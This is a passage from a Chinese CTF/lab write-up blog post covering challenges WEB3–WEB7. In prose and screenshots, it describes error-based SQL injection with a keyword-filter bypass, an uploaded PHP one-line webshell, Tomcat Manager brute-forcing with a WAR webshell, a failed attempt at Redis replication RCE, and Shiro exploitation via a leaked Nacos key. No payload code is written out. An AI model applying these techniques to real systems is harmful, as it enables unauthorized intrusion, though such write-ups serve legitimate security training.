+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">meetsec</span>-web3&#123;flag2-<span class="hljs-number">9</span>edbd4b03b5f86a9abe079bc63ea847b&#125;<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="WEB4"><a href="#WEB4" class="headerlink" title="WEB4"></a>WEB4</h1><h2 id="FLAG1-3"><a href="#FLAG1-3" class="headerlink" title="FLAG1"></a>FLAG1</h2><p>到手先扫个目录先，发现有个后台登陆</p>
+<p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921203838794.png" srcset="/img/loading.gif" lazyload alt="image-20250921203838794"></p>
+<p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921203857569.png" srcset="/img/loading.gif" lazyload alt="image-20250921203857569"></p>
+<p>测试一下sql注入，抓个包测一下</p>
+<p>账号：1’</p>
+<p>发现报错：</p>
+<p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921204248049.png" srcset="/img/loading.gif" lazyload alt="image-20250921204248049"></p>
+<p>从报错信息可以知道表名、字段名，所以我们直接查询账号密码即可</p>
+<p>有报错咱就先想到报错注入</p>
+<p>测试过程发现过滤了挺多东西的，and、select、from都过滤了，select双写就行，and和from双写中间还得加上空格才能绕过</p>
+<p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921210053972.png" srcset="/img/loading.gif" lazyload alt="image-20250921210053972"></p>
+<p>得到用户名：<strong>meetsec</strong></p>
+<p>再查询密码</p>
+<p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921210147940.png" srcset="/img/loading.gif" lazyload alt="image-20250921210147940"></p>
+<p>得到密码：<strong>2446d54c2e68d221db9cff653b01a0e</strong></p>
+<p>是加过密的，去cmd5解密一下，得到</p>
+<p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921210253548.png" srcset="/img/loading.gif" lazyload alt="image-20250921210253548"></p>
+<p><strong>login123</strong></p>
+<p>登录进系统后，在基本设置页面看到有上传，测试一下上传一句话木马</p>
+<p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921210526618.png" srcset="/img/loading.gif" lazyload alt="image-20250921210526618"></p>
+<p>抓包将后缀改回php</p>
+<p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921210621543.png" srcset="/img/loading.gif" lazyload alt="image-20250921210621543"></p>
+<p>发现文件被改名了，直接点击左上角查看即可</p>
+<p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921210831372.png" srcset="/img/loading.gif" lazyload alt="image-20250921210831372"></p>
+<p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921210846021.png" srcset="/img/loading.gif" lazyload alt="image-20250921210846021"></p>
+<p>得到路径，使用蚁剑连接，密码即上传的一句话木马_POST中的内容</p>
+<p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921210951049.png" srcset="/img/loading.gif" lazyload alt="image-20250921210951049"></p>
+<p>根目录得到flag</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">meetsec-web4&#123;flag1-476e2dceb225678<span class="hljs-keyword">cd</span>466fc3<span class="hljs-keyword">cd</span>2b4c59c&#125;<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="WEB5"><a href="#WEB5" class="headerlink" title="WEB5"></a>WEB5</h1><h2 id="FLAG1-4"><a href="#FLAG1-4" class="headerlink" title="FLAG1"></a>FLAG1</h2><p>进入网站是个tomcat页面</p>
+<p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921211211294.png" srcset="/img/loading.gif" lazyload alt="image-20250921211211294"></p>
+<p>点击Manager App登录</p>
+<p>抓包，发现base64编码，解码看看</p>
+<p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921211301994.png" srcset="/img/loading.gif" lazyload alt="image-20250921211301994"></p>
+<p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921211334956.png" srcset="/img/loading.gif" lazyload alt="image-20250921211334956"></p>
+<p>发现就是输入的账号和密码，经过了base64编码，格式为账号:密码</p>
+<p>将其发送到Intruder进行爆破</p>
+<p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921212424628.png" srcset="/img/loading.gif" lazyload alt="image-20250921212424628"></p>
+<p>第一遍跑出来发现没有，去看了下原请求，发现等于号被url编码了，把url编码关了后重新爆破，爆破成功</p>
+<p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921213120926.png" srcset="/img/loading.gif" lazyload alt="image-20250921213120926"></p>
+<p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921213157591.png" srcset="/img/loading.gif" lazyload alt="image-20250921213157591"></p>
+<p>得到账号密码，登录系统</p>
+<p>发现也是有一个上传点，构造一句话木马打包成war包并上传</p>
+<p>不知道为什么蚁剑和冰蝎、哥斯拉连不上，但是直接传参就可以</p>
+<p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921215703377.png" srcset="/img/loading.gif" lazyload alt="image-20250921215703377"></p>
+<p>得到flag</p>
+<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">meetsec-web5</span><span class="hljs-template-variable">&#123;flag1-c7a8d2734ec5a4ed687a9a692ee733f8&#125;</span><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="WEB6"><a href="#WEB6" class="headerlink" title="WEB6"></a>WEB6</h1><h2 id="FLAG1-5"><a href="#FLAG1-5" class="headerlink" title="FLAG1"></a>FLAG1</h2><p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921221015360.png" srcset="/img/loading.gif" lazyload alt="image-20250921221015360"></p>
+<p>看到主机地址，又是redis</p>
+<p>fscan扫出来是redis未访问</p>
+<p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921223445583.png" srcset="/img/loading.gif" lazyload alt="image-20250921223445583"></p>
+<p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921235141053.png" srcset="/img/loading.gif" lazyload alt="image-20250921235141053"></p>
+<p>但是发现写不了计划任务，应该是为了区分之前那题</p>
+<p>写脚本反弹不行</p>
+<p>最后尝试使用主从复制rce</p>
+<p>结果做到半夜再到第二天起床再尝试发现一直连接超时。。实在没办法了</p>
+<hr>
+<h1 id="WEB7"><a href="#WEB7" class="headerlink" title="WEB7"></a>WEB7</h1><h2 id="FLAG1-6"><a href="#FLAG1-6" class="headerlink" title="FLAG1"></a>FLAG1</h2><p>fscan扫出来是nacos</p>
+<p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921225108196.png" srcset="/img/loading.gif" lazyload alt="image-20250921225108196"></p>
+<p>丢工具里跑一下</p>
+<p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921233217826.png" srcset="/img/loading.gif" lazyload alt="image-20250921233217826"></p>
+<p>得到登录账号密码：nacos</p>
+<p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921225609832.png" srcset="/img/loading.gif" lazyload alt="image-20250921225609832"></p>
+<p>在配置中发现Shiro key</p>
+<p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921225656319.png" srcset="/img/loading.gif" lazyload alt="image-20250921225656319"></p>
+<p>去github找到大佬写的强力工具，按照以下顺序直接得到flag</p>
+<p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921234002678.png" srcset="/img/loading.gif" lazyload alt="image-20250921234002678"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">meetsec</span>-web7&#123;flag1-<span class="hljs-number">97</span>fde43b8e55cb2e2b26b7c232ea82fa&#125;<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E9%9D%B6%E5%9C%BA/" class="category-chain-item">靶场</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTF/" class="print-no-link">#CTF</a>
+      
+        <a href="/tags/wp/" class="print-no-link">#wp</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>某靶场实战</div>
+      <div>https://goocean5263.github.io/2025/11/05/某靶场实战/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Goocean5263</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年11月5日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/03/09/Cisco-SD-WAN-RCE-CVE-2026-20127%E5%A4%8D%E7%8E%B0/" title="Cisco-SD-WAN-RCE-CVE-2026-20127复现">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Cisco-SD-WAN-RCE-CVE-2026-20127复现</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/11/03/%E6%9F%90BPM%E7%B3%BB%E7%BB%9F%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CNVD-2026-06635/" title="某BPM系统通用漏洞-CNVD-2026-06635">
+                        <span class="hidden-mobile">某BPM系统通用漏洞-CNVD-2026-06635</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Goocean5263</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
